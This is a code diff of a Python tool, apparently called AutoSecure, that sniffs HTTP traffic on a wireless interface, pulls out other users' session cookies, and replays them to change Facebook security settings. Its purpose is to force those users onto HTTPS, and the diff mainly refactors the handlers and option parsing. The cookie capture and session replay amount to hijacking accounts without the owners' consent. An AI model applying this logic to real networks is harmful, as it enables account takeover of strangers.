@@ -1,3 +1,4 @@
+#!/usr/bin/env python
 import re
 import sys
 
@@ -7,6 +8,8 @@ import dpkt
 import requests
 from pyquery import PyQuery as pq
 
+from autosecure.handlers import all_handlers as handlers
+
 
 DEFAULT_UA = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; MathPlayer 2.10b; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729"
 
@@ -15,46 +18,13 @@ def re_extract(rex, data):
     if m:
         return m.groups()[0]
 
-class Facebook:
-    name = "Facebook"
-    site = ".facebook.com"
-    host = "www.facebook.com"
-    settings_url = "https://www.facebook.com/settings?tab=security&section=browsing&t"
-    url = "/ajax/settings/security/browsing.php"
-    payload = {"post_form_id": None,
-                "fb_dtsg": None,
-                "secure_browsing": "1"
-              }
-
-    def extract_user(self, session):
-        return re_extract("c_user=([^;]+)", session['Cookie'])
-
-    def secure(self, session):
-        payload = self.payload.copy()
-
-        settings_page = requests.get(self.settings_url, headers=session).content
-        q=pq(settings_page)
-
-        #TODO: refacter
-        post_form_id = q("[name=post_form_id]")[0].value
-        payload["post_form_id"] = post_form_id
-
-        fb_dtsg = q("[name=fb_dtsg]")[0].value
-        payload["fb_dtsg"] = fb_dtsg
-
-        url = 'https://%s/%s' % (self.host, self.url)
-        print 'sending payload', payload
-        r = requests.post(url, data=payload, headers=session)
-
-handlers = [Facebook]
-
 class AutoSecure:
-    def __init__(self, device="wlan0"):
-        self.device = device
+    def __init__(self, interface="wlan0"):
+        self.interface = interface
         self.secured_users = set()
 
     def get_packets(self):
-        cap = pcap.pcap(self.device)
+        cap = pcap.pcap(self.interface)
         cap.setfilter('dst port 80')
         for ts, raw in cap:
             eth = dpkt.ethernet.Ethernet(raw)
@@ -101,6 +71,14 @@ class AutoSecure:
         for s in self.get_sessions():
             self.secure_sesion(s)
 
-if __name__ == "__main__":
-    a = AutoSecure()
+def main():
+    from optparse import OptionParser
+    parser = OptionParser()
+    parser.add_option("-i", "--interface", dest="interface", action="store", default="wlan0")
+    (options, args) = parser.parse_args()
+
+    a = AutoSecure(interface=options.interface)
     a.secure_sheep()
+
+if __name__ == "__main__":
+    main()
